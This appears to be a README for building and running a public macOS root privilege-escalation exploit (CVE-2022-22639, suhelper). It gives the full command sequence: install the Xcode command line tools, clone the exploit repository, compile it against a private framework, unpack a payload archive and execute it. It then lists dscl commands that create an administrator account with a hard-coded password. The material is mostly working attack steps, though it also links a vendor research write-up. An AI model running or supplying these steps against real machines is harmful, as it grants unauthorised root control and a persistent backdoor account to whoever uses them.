# Details 

See Blog:

https://www.trendmicro.com/en_us/research/22/d/macos-suhelper-root-privilege-escalation-vulnerability-a-deep-di.html

# Installation of XCode Command Line Tools

You actually don't need the full XCode package from the App Store, and if you're on a machine where you have a regular user and XCode is not yet installed, you may not be able to install it as App Store enforces parental control as well as requiring you to be signed in.

This seems to work as a regular user though. (To be reconfirmed on a fresh new system)

```
xcode-select --install
```

# Build and use the exploit

```
git clone https://github.com/jhftss/CVE-2022-22639
cd CVE-2022-22639
PATH_TO_CONTENT=`pwd`
clang exploit.m -o /tmp/exploit -framework Foundation -fobjc-arc -fobjc-link-runtime /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/System/Library/PrivateFrameworks/SoftwareUpdate.framework/Versions/A/SoftwareUpdate.tbd
cd /tmp
cpio -idv < "${PATH_TO_CONTENT}/InstallAssitant.gz"
./exploit
```

# Adding a new admin user to the system

**NOTE**: If FileVault is enabled, this user will NOT be able to unlock FileVault on boot, or login until another who can has. You may not want to allow a reboot to happen until you've shuffled access and used an existing admin user to grant FileVault access to your new admin.

```
USERNAME=recoveryadmin
UID=1000
dscl . -create /Users/${USERNAME}
dscl . -create /Users/${USERNAME} UserShell /bin/zsh
dscl . -create /Users/${USERNAME} RealName "Recovery Admin"
dscl . -create /Users/${USERNAME} UniqueID ${UID}
dscl . -create /Users/${USERNAME} PrimaryGroupID 20
dscl . -create /Users/${USERNAME} NFSHomeDirectory /Users/${USERNAME}
dscl . -passwd /Users/${USERNAME} P@ssw0rd
dscl . -append /Groups/admin GroupMembership ${USERNAME} 
mkdir -p /Users/${USERNAME}
chown ${USERNAME}:staff /Users/${USERNAME}
```

# Demo

https://www.youtube.com/watch?v=-vbkTLHh874
